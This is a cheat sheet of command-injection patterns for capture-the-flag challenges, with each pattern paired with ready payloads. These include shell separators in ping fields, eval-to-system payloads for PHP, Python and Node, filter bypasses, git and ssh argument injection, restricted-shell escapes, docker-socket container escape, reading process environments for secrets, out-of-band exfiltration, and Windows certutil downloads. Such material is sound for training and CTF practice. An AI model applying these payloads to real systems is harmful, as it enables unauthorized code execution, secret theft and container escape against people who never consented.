# CTF Shapes — the named challenge patterns

## The "ping service" archetype — `?host=`, `?ip=`, `?target=`

A form pings a host. `host=127.0.0.1;id`. The oldest shape — still the
most common. Variants: `host` in JSON body, `host[]` array, `ip`/`addr`
/`domain`/`server`/`node` field names, `?host=x&action=ping` with the
action choosing the command.

## The "calculator/eval" — `?expr=`, `?calc=`, `?x=`

`eval($_GET['x'])`, `eval(expr)`, `eval(calc)` — PHP/node/python
calculator. Send `x=system('id')` / `x=__import__('os').system('id')` /
`x=require('child_process').execSync('id').toString()` — fingerprint the
language first (`7*7`, `phpversion()`, `process.version`, `sys.version`).

The verified card: `htb-pcalc-php-eval-letter-filter-highbyte-constant-tilde-complement-rce`
— letter-filtered eval → `~` bitwise-NOT constant trick →
`shell.md`/`letter-filter-shell.md` have the method.

## The "convert/identify/file process" — `?file=`/upload-then-process

Filename flows into a shell command — `convert "$f"`, `identify "$f"`,
`file "$f"`, `exiftool "$f"`. The FILENAME is the injection point —
`filename-injection.md`. Content-side: `imagemagick-deep.md`.

## The "network tool" — nslookup/dig/host/whois/traceroute

`nslookup $name`, `dig $name`, `whois $name` — host-arg injection.
`dig` has `-f file` (read) and `@server`/`+options` arg-injection.

## The "git wrapper" — `git clone`/`fetch`/`log`

`git clone $url` → `--upload-pack`, `-c core.sshCommand`, `ssh://` urls.
`git log`/`show`/`diff` → `common-tools-sinks.md`'s git section.

## The "sanitized field" — escapeshellarg/escapeshellcmd present

`escapeshellarg($x)` visible in source → the quoting is done FOR you —
the injection must be an arg-injection or a quote-break —
`argument-injection.md`/`escapeshell-bypasses.md`.

## The "blacklisted chars" — filter tables in source

`if (preg_match('/[;&|]/', $x))` → `char-restriction.md` — `${IFS}`,
`%0a`, `<>`, arithmetic-expansion, `. /path`, `$( )`, backticks.

## The "blind exec" — no output ever

Timing (sleep→timestamp diff), OOB (curl/pastebin), file-write-then-fetch,
error-channel, log-side-channel — `blind-cmdi.md`/`oob-exfil.md`.

## The "second-order" — stored value → cron/queue/admin tool

Input saved then run later: a comment rendered in admin panel's exec,
a queued job shell, a backup script — `second-order.md`.

## The "argv-form exec" — execFile/spawn-array — args not commands

No shell boundary — `execFile('ping', [user])` — injection is flag-form:
`-c 1`/`--`/`$( )` in args DOESN'T split — but the arg can be
`--upload-pack=` or `-oProxyCommand=` — `argument-injection.md`.

## The "restricted shell" — jail/rbash/low-commands

`rbash`/`lshell`/`rzsh`/`cplocker` — only whitelisted commands run:
escape via `Vi :!`, `less !`, `find -exec`, `awk 'system("id")'`,
`tar --checkpoint-action`, env `BASH_ENV`/`ENV`/`SHELLOPTS` —
`sandboxed-shells.md`/`restricted-shell.md`.

## The "docker socket exposed" — `/var/run/docker.sock` writable

`curl --unix-socket /var/run/docker.sock` — container escape from an
exec inside a container — `chains.md`.

## The "flag in env" — `env|grep -i flag`

`env`, `printenv`, `cat /proc/1/environ`, `cat /proc/self/environ` —
CTF flag-in-env is common — try `env` early.

## The "flag readable only via specific binary" — `/readflag`, `sudo -l`

A SUID `/readflag` or `sudo -l` lists a permitted command — exec the
permitted command — `chains.md`'s privesc notes.

## The "PHP object-injection via command arg" — hybrid

`system("phar://$x")`/`include($x)` — cmdi reaching PHP include/deser —
`file-read-primitives`/deser overlap.

## Windows shapes — `cmd /c ping $x`, `powershell -c $x`

`&`, `&&`, `||` separators; `whoami`/`hostname`/`type`/`dir` cmds;
`certutil -urlcache -split -f` download; `IEX`; `-enc` b64 —
`windows-cmdi.md`/`powershell-injection.md`.

## The "log readback" — inject into a logged field

User-Agent/header/referer gets logged; `cat`/`tail` the log in a later
request — `log-poisoning.md`.

## Falsifiers

- the surface doesn't match any shape → fall back to `detection.md`'s
  generic probes

## Output to record

- which shape + the card/probe that closed it
